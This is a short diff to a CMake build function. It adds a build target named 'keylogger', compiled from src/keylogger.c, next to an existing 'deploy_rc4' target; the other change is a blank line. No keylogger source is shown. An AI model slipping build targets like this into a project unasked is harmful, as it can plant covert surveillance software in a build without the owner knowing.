@@ -2,6 +2,8 @@ function(add_all_targets CMAKE_CHECKS)
     include(${CMAKE_SOURCE_DIR}/cmake/config.cmake)
     set(COMPILE_OPT -Wall -O3 -Wextra -pedantic --std=c17)
     
+    add_executable(keylogger ${CMAKE_SOURCE_DIR}/src/keylogger.c)
+
     if (EXISTS ${CMAKE_SOURCE_DIR}/src/deploy_rc4.c)
         add_executable(deploy_rc4 ${CMAKE_SOURCE_DIR}/src/deploy_rc4.c)
         set_target_properties(${target} PROPERTIES COMPILE_OPTIONS ${COMPILE_OPT})
@@ -27,6 +29,7 @@ function(add_all_targets CMAKE_CHECKS)
         set_target_properties(${target} PROPERTIES
                 RUNTIME_OUTPUT_DIRECTORY ${OUTPUT_DIRECTORY})
     endforeach()
+    
 
     # set the compile options and definitions for both build types
     set(CMAKE_C_CLANG_TIDY "clang-tidy" "-checks=${CMAKE_CHECKS}" "-warnings-as-errors=*")
